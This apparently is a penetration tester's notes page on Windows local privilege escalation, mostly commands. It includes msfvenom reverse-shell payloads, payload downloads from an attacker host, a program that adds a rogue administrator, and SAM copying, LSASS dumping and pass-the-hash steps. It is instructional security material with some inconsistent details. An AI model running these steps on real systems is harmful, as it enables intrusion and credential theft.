# Windows Local Privilege Escalation

## Windows Privilege Escalation

Our ultimate goal is to escalate from a low privileged user to a user that runs as an Administrator or the SYSTEM user. Privilege escalation may not always be based on a single misconfiguration, but rather on your ability to conceptualize and integrate many misconfigurations. Many privilege escalations vectors might be considered access control violations. User authorization and access control are inextricably related. Understanding how Windows manages permissions is critical when focusing on privilege escalations in Windows.

## General Concepts

### User Accounts

Consider a user account to be a collection of preferences and settings tied to a single identity. During the operating system installation, the local “Administrator” account is created by default. Depending on the version of Windows, there may be other default user accounts.

### Service Accounts

In Windows, service accounts are used to operate services. Service accounts aren't allowed to log into Windows. The **SYSTEM** account is the default service account in Windows, and it has the most rights of any local account. The **NETWORK SERVICE** and **LOCAL SERVICE** are two other default service accounts.

### Groups

Users can be members of numerous groups, and groups can have multiple members. Groups make it easy to govern who has access to what resources. 

Regular groups have a set of members, for example:

* Administrators 
* Users 

Pseudo groups have a dynamic membership list that varies based on certain interactions, for example:

*  Authenticated Users

### Objects

These are the main objects of the Windows Operating System:

* User object
* Contact object
* Printer object
* Computer object
* Shared folder
* Group
* Organizational Unit
* Domain
* Domain controller
* Site objects
* Bulletin
* Foreign security principals

#### **User object**

A user object in AD represents a real user who is part of an organization’s AD network.  It is a leaf object, which means it can’t contain other AD objects within itself. The user may be an employee of the organization such as a manager, HR person, or an IT administrator who generally has elevated permissions over other users. A user object is a security principal, which means that it would have a security identifier \(SID\) apart from a global unique identifier \(GUID\). A user object in AD has attributes that contain information such as canonical names. first name, middle name, last name, login credentials telephone number, the manager who he or she reports to, address, who their subordinates are, and more.

#### **Contact object**

A contact object in AD represents a real contact person who is not a part of the organization but is associated with it. For example, an organization’s supplier or vendor is not a part of the organization but is still a contact person. It is a leaf object, which means it can’t contain other AD objects within itself. A contact object in AD is not a security principal, and so it only has a GUID. A contact object in AD has attributes that contain information such as their name, email address telephone number, and more. These contact objects would usually not require access to the Ad network. They are just a type of AD object that is used to reference the contact person’s information, as a contact card.

#### **Printer object**

A printer object in AD is a pointer that points towards a real printer in the AD network.  It is a leaf object, which means it can’t contain other AD objects within itself.A printer object is not a security principal, and so it only has a GUID. A printer object in AD has attributes that contain information like the printer’s name, driver name, color mode, port number, and more.

#### **Computer object**

A computer object in AD represents a computer that is part of an organization’s AD network. The user may belong to any of the employees in the organization. It is a leaf object, which means it can’t contain other AD objects within itself. A computer object in AD is also a security principal, similar to the user object. So, computers also have SIDs apart from GUIDs. A computer object in AD has attributes that contain information such as computer name, computer name \(pre-Windows 2000\), its unique ID, DNS name, role, description, location, who the computer is managed by, the operating system version it is running on, and more.

#### **Shared folder**

A shared folder object in AD is a pointer that points towards the shared folder on the computer the folder is stored. A shared folder is a folder that is shared between members of the AD network, and only those members can view the contents of the folder, while other members will be denied access. It is a leaf object, which means it can’t contain other AD objects within itself. A shared folder object in AD is not a security principal, and so it only has a GUID. A shared folder object in AD has attributes that contain information such as the folder’s name, location, access privileges, and more.

#### **Group**

A group object in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, a group object is a container object. A group object in AD is a security principal too, similar to the user and computer objects. So, group objects also have SIDs apart from GUIDs. A group object is used to share permissions to member AD objects within the group. A group object in AD has attributes that contain information such as the group name, member objects in the group, and more.

#### **Organizational Unit**

An organizational unit \(OU\) in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, an OU is also a container object like groups. An OU in AD is a security principal too, similar to a user, computer, and group objects. So, OUs also have SIDs apart from GUIDs. An OU is used to delegate roles to member AD objects within the group. An OU in AD has attributes that contain information such as its name, member objects in the OU, and more.

#### **Domain**

A domain in AD is a structural component of the AD network. Domains contain AD objects such as users, printers, computers, and contacts, which may be organized into OUs and groups. Each domain has its own database, and also its own set of defined policies that are applied to all the AD objects within the domain.

#### **Domain controller**

A domain controller \(DC\) object in AD references a server that acts as a domain controller for the domain in which it is placed. The DC maintains the policies, authenticates AD users, and is also takes care of roles that all DCs in a domain should perform.

#### **Site objects**

Site objects in AD are objects that are implemented in the Active Directory network to manage and facilitate the process of replication.

#### **Bulletin**

Builtin objects, like groups and OUs, are contained objects. Builtin contains local groups that are predefined during the creation of the AD network.

#### **Foreign security principals**

Foreign security principal objects are container objects. These objects show the trust relationships that a domain has with other domains in the particular AD network.

The text above was extracted from here:

{% embed url="https://www.windows-active-directory.com/active-directory-objects-list.html" %}

### ACL / ACE

In Windows, there are multiple objects: 

* Files / Directories 
* Registry Entries 
* Services 
* Others

The access control list for a resource determines whether a user or group has permission to perform a specific action on it \(ACL\). The resource's access control list decides whether or not a person or group has authorization to perform a given action on it \(ACL\).

There are zero or more access control items in each ACL \(ACEs\). Each ACE establishes a link between a principal \(such as a user or a group\) and a specific access privilege.

### Integrity Levels

All protected items from Windows Vista have an integrity level assigned to them. The default integrity label for most user and system files and registry keys on the system is "medium." The only exception is a set of particular directories and files that can be written to using Internet Explorer 7's Low Integrity mode. Most processes run by normal users \(even those initiated by a user in the administrators' group\) are labeled with medium integrity, while most services are labeled with System integrity. A high-integrity label protects the root directory. It's worth noting that a process with a lower integrity level can't write to a higher-integrity object.

Integrities:

* **Untrusted** – processes that are logged on anonymously are automatically designated as Untrusted. Example: Chrome
* **Low** – When interacting with the Internet, the Low integrity level is utilized by default. All files and processes connected with Internet Explorer are assigned the Low integrity level as long as it is running in its default configuration, Protected Mode. The Low integrity level is also allocated by default to some folders, such as the Temporary Internet Folder.
* **Medium** – The most common context in which most items will run is medium. The Medium integrity level is assigned to standard users, and any item not specifically specified with a lower or higher integrity level is assigned to Medium by default. Not that a member of the Administrators group will employ medium integrity levels by default.
* **High** – Administrators are given a high level of integrity. Administrators can interact with and edit things with Medium or Low integrity levels, but they can't communicate with or modify objects with a High integrity level, which normal users can't do. "Run as Administrator" is an example.
* **System** – The System Integrity level is reserved for the system, as the name implies. The System integrity level is assigned to the Windows kernel and core services. Being higher than Administrators High Integrity level safeguards these fundamental functions from being harmed or compromised by Administrators. Services are an example.
* **Installer** – The Installer integrity level is the greatest of all integrity levels and is a special situation. Objects with the Installer integrity level can remove all other objects because it is equivalent to or higher than all other WIC integrity levels.

You can enumerate your current integrity level using `whoami /groups`

### Local Group Administrator

We can add a low privileged user to the Local Administrators group with the following command:

```text
net localgroup administrators <username> /add
```

## Automated Enumeration Tools

### **windows-privesc-check**

{% embed url="https://github.com/pentestmonkey/windows-privesc-check" %}

Display Help:

```text
windows-privesc-check2.exe -h
```

Dump groups:

```text
windows-privesc-check2.exe --dump -G
```

### winPEAS

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

### PowerUp

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

## Administrator Executables

### C Executables

Add a new user to the Administrators group:

```c
#include <stdlib.h>

int main ()
{
    int var;
    var = system ("net user evil password /add");
    var = system ("net localgroup administrators evil /add");
    return 0;
}
```

Compile the code with:

```text
sudo i686-w64-mingw32-gcc filename.c -o filename.exe
```

## System Information

### Version information enumeration

Enumerate the Windows version and check if it has any known vulnerability:

```text
# Old Commands
systeminfo
#Get only that information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
#Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn 
#Get system architecture
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% 

# PowerShell
[System.Environment]::OSVersion.Version #Current OS version
#List all patches
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} 
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

#### Version Exploits

On the local system

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

Locally with system information

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}



{% embed url="https://github.com/bitsadmin/wesng" %}

Github repos of exploits:

{% embed url="https://github.com/abatchy17/WindowsExploits" %}

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}



### Environment

Any credential/Juicy info saved in the env variables?

```text
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### PowerShell History

```text
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript files

```text
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts
​
#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell Module Logging

It keeps track of PowerShell's pipeline execution data. This includes all of the commands that are run, including command invocations and certain scripts. It is possible that it does not have all of the details of the execution and the output outcomes. You can activate this by selecting "Module Logging" instead of "Powershell Transcription" from the last section's link \(Transcript files\).

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

To view the last 20 events from PowerShell logs you can execute:

```text
Get-WinEvent -LogName "windows Powershell" | select -First 20 | Out-GridView
```

### PowerShell  Script Block Logging

It captures the entire action and substance of the script by recording blocks of code as they are executed. It keeps a complete audit record of all activities, which can be utilized in forensics and to investigate malicious behavior later. It keeps track of every activity at the time of execution and so offers complete information.

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

The Script Block logging events can be found in **Windows Event Viewer** under the following path: `Application and Sevices Logs > Microsoft > Windows > Powershell > Operational` 

To view the last 20 events you can use:

```text
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet Settings

```text
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Drives

```text
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## Un/Mounted File Systems

We can enumerate unmounted file systems/volumes with:

```text
mountvol
mountvol [drive:]path VolumeName
```

## Files/Directories Permissions

We can recursively enumerate files or directories permissions with:

```text
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

* Get-ACL = retrieve all permissions for a given file or directory
* Get-ChildItem = enumerate everything under the specified argument
* -Recurse = recursive search
* AccessToString -match = properties specified

 Alternatively, we can use `accesschk.exe` from SysternalsSuite:

```text
accesschk.exe -uws "Everyone" "C:\Program Files"
```

* -u = suppress errors
* -w = write access permissions
* -s = recursive search

 

## Drivers and Kernel Vulnerabilities

Windows Exploit Suggester: 

{% embed url="https://github.com/bitsadmin/wesng" %}

Precompiled Kernel Exploits: 

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

Watson: 

{% embed url="https://github.com/rasta-mouse/Watson" %}

Enumerate the operating system with:

```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Enumerate drivers with `driverquery`:

```text
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

* /v = verbose
* /fo = file output format

Enumerate drivers with `WmiObject`:

```text
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

* Win32\_PnPSignedDriver = provide digital signature information about the driver

 

## High Integrity to System

### Method Creating a New Service

If you are already running on a High Integrity process, the escalation to SYSTEM can be done by creating and executing a new service:

```text
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

## Service Vulnerabilities

### Prerequisites

Before considering that we can take some service to escalate our privileges, we must answer the questions below first: 

* **Can we stop the service?**

```text
net stop <service_name>
```

* **Can we start the service?**

```text
wmic service where caption="service_name" get name, caption, state, startmode
```

* **Does the service requires a reboot, if so can we reboot the machine?**

```text
whoami /priv
```

* **Reboot a machine**

```text
shutdown /r /t 0
```

* /r = reboot
* /t = time in seconds

### Enumerating Services

#### tasklist

We can use tasklist to enumerate running tasks:

```text
tasklist /SVC
```

> Note: It does not list processes run by privileged users, it needs higher privileges to do it.

#### PowerShell WmiObject

We can enumerate running services with:

```text
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

#### icacls

We can also use `icacls` to enumerate permissions:

```text
icacls "filename.exe"
```

Do BUILTIN\Users have F, M or R, or W?

* F = Full Access
* M = Modify Access
* RX = Read and execute access
* R = Read-only access
* W = Write-only access

### Service Commands

Query the configuration of a service:

```text
> sc.exe qc <name>
```

Query the current status of a service:

```text
> sc.exe query <name>
```

Modify a configuration option of a service:

```text
> sc.exe config <name> <option>= <value>
```

Start/Stop a service:

```text
> net start/stop <name>
```

### Insecure Service Permissions

Each service has an ACL that specifies permissions specific to that service.

Services Permissions:

* SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS
* SERVICE\_STOP, SERVICE\_START
* SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS

If our user has the ability to change the configuration of a service that runs with SYSTEM privileges, we can replace the service's executable with one of our own. You might not be able to elevate privileges if you can change a service's settings but not stop/start it!

#### Insecure Service Privilege Escalation 

Use winPEAS to check for service misconfigurations:

```text
> .\winPEASany.exe quiet servicesinfo
```

1. We can confirm this with accesschk.exe:

   ```text
   > .\accesschk.exe /accepteula -uwcqv user <service_name>
   ```

2. Check the current configuration of the service:

   ```text
   > sc qc <service_name>
   ```

3. Check the current status of the service:

   ```text
   > sc query <service_name>
   ```

4. Reconfigure the service binary path to use our reverse shell executable:

   ```text
   > sc config <service_name> binpath= "\"C:\Users\Public\reverse.exe\""
   ```

5. Start a listener on Kali, and then start the service to trigger the exploit:

   ```text
   > net start <service_name>
   ```

### Unquoted Service Path



**Valid executable path Discovery:**

```text
wmic service get displayname, pathname
```

**Move the malicious executable:**

```text
move filename.exe "c:\program files\service\filename.exe"
```

**Restart the service or the machine.**

## Registry

### AutoRuns

When Windows starts up, it may be configured to perform commands with elevated privileges. These "AutoRuns" are set up via the Registry. If you can write to an AutoRun executable and restart the system, you might be able to elevate privileges \(or wait for it to restart\).

#### AutoRuns Privilege Escalation Methodology

1. Use winPEAS to check for writable AutoRun executables:

   ```text
   .\winPEASany.exe quiet applicationsinfo
   ```

2. Alternatively, we could manually enumerate the AutoRun executables:

   ```text
   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   ```

   and then use accesschk.exe to verify the permissions on each one:

   ```text
   .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
   ```

3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:

   ```text
   copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
   ```

4. Copy our reverse shell executable to overwrite the AutoRun executable:

   ```text
   copy /Y C:\Users\Public\reverse.exe "C:\Program Files\Autorun Program\program.exe"
   ```

5. Start a listener on your host, and then restart the target to trigger the exploit. 

### AlwaysInstallElevated

MSI files are program installation package files. These files are installed with the permissions of the user who is attempting to install them. These installers can be launched with elevated \(i.e. admin\) capabilities in Windows. If this is the case, a malicious MSI file containing a reverse shell can be created.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine and the current user:

```text
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If either of these is missing or disabled, the exploit will **not** work.

#### AlwaysInstallElevated Privilege Escalation Methodology

1. Use winPEAS to see if both registry values are set:

   ```text
   .\winPEASany.exe quiet windowscreds
   ```

2. Alternatively, verify the values manually:

   ```text
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:

   ```text
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
   ```

4. Copy the reverse.msi across to the Windows target, start a listener in your host, and run the installer to trigger the exploit:

   ```text
   msiexec /quiet /qn /i C:\Users\Public\reverse.msi
   ```

## Passwords, Hashes, or Credentials

Sometimes administrators re-use passwords or leave them on computers in easily accessible places. Windows is particularly vulnerable to this since various features of the operating system store credentials insecurely.

### Common Files Containing Credentials

This is a list of known files that contained passwords in clear-text or Base64:

```text
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

### Winlogon Credentials

### Credentials Manager

### DPAPI

### Saved RDP Authentications

### AppCmd.exe

### SCClient \| SCMM

### Browser History

### Cached GPP Password

### IIS Web Configuration

### Credentials in Recycle Bin

###  Emails

#### Thunderbird

```text
C:\Users\username\AppData\Roaming\Thunderbird\Profiles\hahaha.default-release\Mail\mail.sandbox.local\Inbox.
```

### Registry

The Windows Registry is used by many apps to store configuration options. Passwords are sometimes stored in plaintext in the Registry.

#### Searching the Registry for Passwords

The commands below will look for entries and values in the registry that contain the word "password."

```text
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Because this frequently yields a large number of results, it is often better to search in well-known areas.

#### Registry Passwords Privilege Escalation Methodology

1. Use winPEAS to check common password locations:

   ```text
   .\winPEASany.exe quiet filesinfo userinfo
   ```

2. The results show both AutoLogon credentials and Putty session credentials for the admin user 

   `(admin/r4nd0mp44ss)`.

3. We can verify these manually:

   ```text
   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
   reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
   ```

4. On our host, we can use the winexe command to spawn a shell using these credentials:

   ```text
   winexe -U 'admin%r4nd0mp44ss' //192.168.1.22 cmd.exe
   ```

### Saved Credentials

The runas command in Windows allows users to execute commands with the permissions of other users. This normally necessitates knowing the password of the other user. Users can save their credentials to the system in Windows, and these saved credentials can be exploited to get around this requirement.

#### Saved Credentials Privilege Escalation

1. You can check for saved credentials with winPEAS:

   ```text
   > .\winPEASany.exe quiet cmd windowscreds
   ```

2. Using the following command, we can manually verify this:

   ```text
   > cmdkey /list
   ```

3. As the admin user, we may utilize the saved credentials to run any command. On your host \(e.g Kali or Parrot\), start a listener and execute the reverse shell executable:
4. ```text
   > runas /savecred /user:admin C:\PrivEsc\reverse.exe
   ```

### SSH Keys in Registry

### Passwords in Memory 

Procdump from Sysinternals can be used to create a memory dump of a running process. Try to dump the memory and read the credentials from services like FTP, which have the credentials in clear text in memory.

```text
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Saved Credentials

The runas command in Windows allows users to execute commands with the permissions of other users. This normally necessitates knowing the password of the other user. Users can save their credentials to the system in Windows, and these saved credentials can be exploited to get around this requirement.

#### Saved Credentials Privilege Escalation Methodology

1. Use winPEAS to check for saved credentials:

   ```text
   .\winPEASany.exe quiet cmd windowscreds
   ```

2. It may have some credentials for a user that exist.
3. We can verify this manually using the following command:

   ```text
   cmdkey /list
   ```

4. If the saved credentials aren’t present, run the following script to refresh the credential:

   ```text
   C:\Dir\savecred.bat
   ```

5. We can use the saved credential to run any command as the admin user. Start a listener On your host and run the reverse shell executable:

   ```text
   runas /savecred /user:valid_username C:\Users\Public\reverse.exe\
   ```

### Configuration Files

Some administrators will leave configurations files on the system with passwords in them. This may be seen in the Unattend.xml file. It enables Windows systems to be set up in a largely automated manner.

#### Enumerating Configuration Files

Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:

```text
dir /s *pass* == *.config
```

Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:

```text
findstr /si password *.xml *.ini *.txt
```

#### Configuration Files Privilege Escalation Methodology

1. Use winPEAS to search for common files which may contain credentials:

   ```text
   .\winPEASany.exe quiet cmd searchfast filesinfo
   ```

2. The Unattend.xml file was found. View the contents:

   ```text
   type C:\Windows\Panther\Unattend.xml
   ```

3. A password for the admin user was found. The password is Base64 encoded: cGFzc34vcmQxMjM=
4. On your host we can easily decode this:

   ```text
   echo "cGFzc3dvcmxMjM=" | base64 -d
   ```

5. Once again we can simply use winexe to spawn a shell as the admin user.

### SAM

The Security Account Manager in Windows stores password hashes \(SAM\). The hashes are encrypted using a key that can be obtained in the SYSTEM file. You can dump the hashes and utilize them using PassTheHash or crack them if you are able to read the SAM and SYSTEM files.

#### SAM/SYSTEM Locations

The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory. The files are locked while Windows is running. 

Backups of these files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories.

#### SAM/SYSTEM Privilege Escalation Methodology

1. Copy the files back to our host:

   ```text
   copy C:\Windows\Repair\SAM \\192.168.10.10\tools\
   copy C:\Windows\Repair\SYSTEM \\192.168.10.10\tools\
   ```

2. Download the latest version of the creddump suite:

   ```text
   git clone https://github.com/Neohapsis/creddump7.git
   ```

3. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:

   ```text
   python2 creddump7/pwdump.py SYSTEM SAM
   ```

4. Crack the admin user hash using hashcat:

   ```text
   hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
   ```

Alternatively, save SAM, SYSTEM, and SECURITY with registry:

```text
reg save hklm\sam c:\SAM
reg save hklm\system c:\SYSTEM
reg save hklm\security c:\SECURITY
```

Alternatively, we can use `impacket-secretsdump`:

```text
impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
```

### Dump NTDS Database

#### ndtsutil

The ntdsutil utility can be used to backup the database:

```text
ntdsutil "ac in ntds" i "cr fu c:\temp" q q
```

#### impacket-secretsdump

Alternatively, you can use `impacket-secretsdump`, however, for this, you need the NTDS:

```text
impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

### Dump LSASS Login Credentials

The Local Security Authority Subsystem Service \(LSASS\) is a process responsible for enforcing security on a Windows system. By creating a memory dump of the process, we can extract plaintext credentials.

With local administrator rights on a host, open task manager, find lsass.exe, right-click and select “Create Dump File”

![Task Manager -&amp;gt; Details -&amp;gt; lsass.exe](../.gitbook/assets/image%20%2824%29.png)

Create a dump file:

![Create dump file](../.gitbook/assets/image%20%2823%29.png)

Then you will receive this message:

![](../.gitbook/assets/image%20%2826%29.png)

Mimikatz can then dump the plaintext login credentials:

```text
sekurlsa::Minidump lsass.DMP
sekurlsa::logonPasswords
```

### Dump Wi-Fi Passwords

We can dump wi-fi passwords with netsh:

```text
netsh wlan show profiles
netsh wlan show profile name="ConnectionName" key=clear
```

### **Passing the Hash**

Windows accepts hashes to authenticate to a number of services. We can use pth tools to perform a pass-the-hash in order to log in with the hash.

#### PTH Privilege Escalation Methodology

1. Use the hash with pth-winexe to spawn a command prompt:

   ```text
   pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
   ```

2. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:

   ```text
   pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
   ```

## Scheduled Tasks

Windows can be set up to do tasks at certain times, on a regular basis \(e.g. every 5 minutes\), or in response to a specific event \(e.g. a user login\). Tasks are typically performed with the privileges of the person who created them, but administrators can set up tasks to run as other users, including SYSTEM.

Scheduled Tasks can be created with the Task Scheduler program in Windows.

### Enumeration

Unfortunately, as a low-privileged user account, there is no straightforward way to enumerate custom tasks that belong to other users. Unless that we have GUI access with RDP or VNC, or something with a UI so that we can use the Task Scheduler program. 

The following command list all the scheduled jobs that your user can see:

```text
schtasks /query /fo LIST /v

/query = display tasks
/fo LIST = simple list output format
/v = verbose output

# Intersting Output
Next Run Time:
Last Run Time:
Task To Run:
Schedule Type:
Start Time:
Start Date:

#PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

One way to get hints can be by locating a script or log file that indicates a scheduled activity is being run, which is frequently required.

#### Scheduled Tasks Privilege Escalation

1. Check if we have write access to the script and that's running as Administrator or SYSTEM:

   ```text
   > C:\Dir\accesschk.exe /accepteula -quvw user C:\Dir\Vulnerable.ps1
   ```

2. Create a backup of the script:

   ```text
   > copy C:\Dir\Vulnerable.ps1 C:\Temp\
   ```

3. Start a listener on your host \(e.g Kali or Parrot\).
4. Add a call to our reverse shell executable to the end of the script with echo:

   ```text
   > echo C:\PrivEsc\reverse.exe >> C:\Dir\Vulnerable.ps1
   ```

5. To finish the exploit, wait for the scheduled task to run \(it should run every x amount of time\).

## AlwaysInstallElevated

### Malicious MSI

These registry keys tell windows that a user of any privilege can install `.msi` files are NT AUTHORITY\SYSTEM. All that we need to do is create a malicious `.msi` file, and run it.

We can use `msfvenon` to create the MSI installer. We’ll use a reverse shell payload that I can catch with `nc`:

```bash
wixnic@kali$ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev.msi
```

We’ll upload it just like I did with WinPEAS:

```bash
C:\ProgramData>powershell wget http://10.10.14.6/rev.msi -outfile rev.msi
```

This requests the file from our Python webserver and fetches the MSI.

Now we just need to run it with `msiexec`:

```text
C:\ProgramData>msiexec /quiet /qn /i rev.msi
```

This returns nothing, but there’s a shell at our listening `nc`:

```text
wixnic@kali$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 61878
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

We can grab the root flag from the administrator’s desktop:

```text
C:\Users\Administrator\Desktop>type root.txt
82f9ddad************************
```

## Applications

### Insecure GUI Apps 

Users on some \(earlier\) versions of Windows may be given the ability to execute some GUI software with administrator capabilities. There are a variety of methods for spawning command prompts from within GUI software, including native Windows capability. The generated command prompt will execute with administrator privileges because the parent process is running with them.

#### Insecure GUI Apps Privilege Escalation

1. Open a command prompt and run:

   ```text
   > tasklist /V | findstr vulnerable.exe
   ```

   > Note that the executable must be running with admin privileges.

2. In the vulnerable GUI executable, click File, then Open.
3. In the navigation input, replace the contents with a malicious file:

   ```text
   file://c:/windows/system32/cmd.exe
   ```

4. Press Enter and then the malicious file will be executed.

### Startup Apps

By setting shortcuts to programs in a certain directory, each user can determine which apps start when they log in. For apps that should start for all users, Windows additionally includes a startup directory:

```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

We can use our reverse shell executable to escalate privileges when an admin logs in **if we can create files in this directory**.

It's important to remember that shortcut files \(.lnk\) must be used. To make a shortcut file, use the following VBScript:

```text
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Users\Public\reverse.exe"
oLink.Save
```

#### Startup Apps Privilege Escalation

